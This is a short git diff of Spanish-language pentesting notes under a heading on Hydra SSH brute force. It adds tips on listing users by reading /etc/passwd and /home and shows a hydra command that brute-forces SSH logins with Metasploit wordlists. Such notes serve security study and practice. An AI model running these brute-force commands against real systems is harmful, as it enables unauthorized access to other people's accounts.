@@ -76,6 +76,13 @@ Esto se usa en el panel del admin de WordPress.
 
 ## Hydra fuerza bruta SSH
 
+```bash 
+# Una forma de saber los usuarios dentro de la maquina por SSH es:
+
+1. Mirando el '/etc/passwd'
+2. Mirando el directorio '/home'
+```
+
 ```python
 ❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://❮IP❯ -t 4
 # Haremos un ataque de fuerza bruta al puerto SSH
